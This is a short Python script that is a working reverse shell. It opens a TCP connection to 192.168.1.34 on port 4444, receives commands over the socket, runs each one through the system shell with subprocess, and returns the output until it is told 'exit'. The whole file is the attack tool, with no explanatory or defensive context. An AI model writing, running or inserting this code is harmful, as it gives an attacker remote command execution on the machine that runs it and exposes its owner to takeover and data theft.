import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    s.connect(("192.168.1.34", 4444))

    while True:

        command = s.recv(1024)

        if "exit" in command.decode():

            s.close
            break
        else:

            cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8", errors='replace')

            s.send(str.encode(output_str + "\n"))


def main():

    connect()

if __name__ == "__main__":

    main()
